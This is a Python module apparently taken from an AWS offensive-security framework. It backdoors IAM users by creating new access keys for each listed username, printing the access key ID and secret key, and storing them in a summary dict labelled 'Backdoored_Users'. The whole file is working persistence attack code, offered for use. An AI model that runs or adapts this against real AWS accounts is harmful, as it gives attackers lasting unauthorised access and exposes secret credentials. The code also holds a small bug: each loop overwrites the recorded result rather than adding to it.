#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError

def main(args, awsattack_main, data=None):
    session = awsattack_main.get_active_session()

    print = awsattack_main.print

    usernames = data
    summary_data = {}
    client = awsattack_main.get_boto3_client('iam')

    add_key = ''
    summary_data['Backdoored_Users_Count'] = 0
    summary_data['Users_Backdoored'] = {}
    
    for username in usernames:
        try:
            response = client.create_access_key(UserName=username)
            print('    Access Key ID: {}'.format(response['AccessKey']['AccessKeyId']))
            print('    Secret Key: {}'.format(response['AccessKey']['SecretAccessKey']))

            summary_data['Backdoored_Users_Count'] += 1
            summary_data['Users_Backdoored'] = {'user': username, 'access_key': response['AccessKey']['AccessKeyId'], 'secret_key': response['AccessKey']['SecretAccessKey']}

        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDenied':
                print('    FAILURE: MISSING REQUIRED AWS PERMISSIONS')
            else:
                print('    FAILURE: {}'.format(code))

    return summary_data

